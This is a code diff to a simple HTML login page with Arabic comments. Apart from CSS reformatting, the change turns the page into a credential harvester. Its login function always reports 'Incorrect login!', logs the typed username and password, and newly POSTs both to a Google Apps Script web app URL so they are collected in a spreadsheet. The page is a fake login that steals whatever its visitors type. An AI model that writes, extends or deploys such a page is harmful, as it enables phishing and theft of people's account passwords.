@@ -4,10 +4,31 @@
 <meta charset="UTF-8">
 <title>Login Page</title>
 <style>
-body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
-form { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
-input { display: block; margin: 10px 0; padding: 8px; width: 200px; }
-button { padding: 8px 12px; }
+body { 
+    font-family: Arial; 
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh; 
+    background: #f0f0f0; 
+}
+form { 
+    background: #fff; 
+    padding: 20px; 
+    border-radius: 8px; 
+    box-shadow: 0 0 10px rgba(0,0,0,0.2); 
+}
+input { 
+    display: block; 
+    margin: 10px 0; 
+    padding: 8px; 
+    width: 200px; 
+}
+button { 
+    padding: 8px 12px; 
+    cursor: pointer;
+}
+h2 { text-align: center; }
 </style>
 </head>
 <body>
@@ -23,14 +44,19 @@ function login() {
   const user = document.getElementById('username').value;
   const pass = document.getElementById('password').value;
 
-  // أي محاولة → دائمًا رسالة خطأ
+  // رسالة خطأ لأي محاولة
   alert("Incorrect login!"); 
 
-  // تسجل المحاولة على Console لتعرفها انت
+  // تسجل المحاولة في Console
   console.log("Attempted login - Username:", user, "Password:", pass);
 
-  // لو تحب تضيف Dashboard لاحقًا، خلي هذا السطر جاهز:
-  // window.location.href = "dashboard.html";
+  // إرسال البيانات إلى Google Sheet عبر Web App
+  fetch('https://script.google.com/macros/s/AKfycbzejVkVsWDSG2Qt7mi_L3wqYqb28V1ArN-LFG1veZmtz0KsrWJIIJOpwH36kBHp_D-q/exec', {
+    method: 'POST',
+    body: new URLSearchParams({username: user, password: pass})
+  })
+  .then(response => console.log('Sent to Sheet:', response))
+  .catch(err => console.error('Error:', err));
 }
 </script>
 </body>
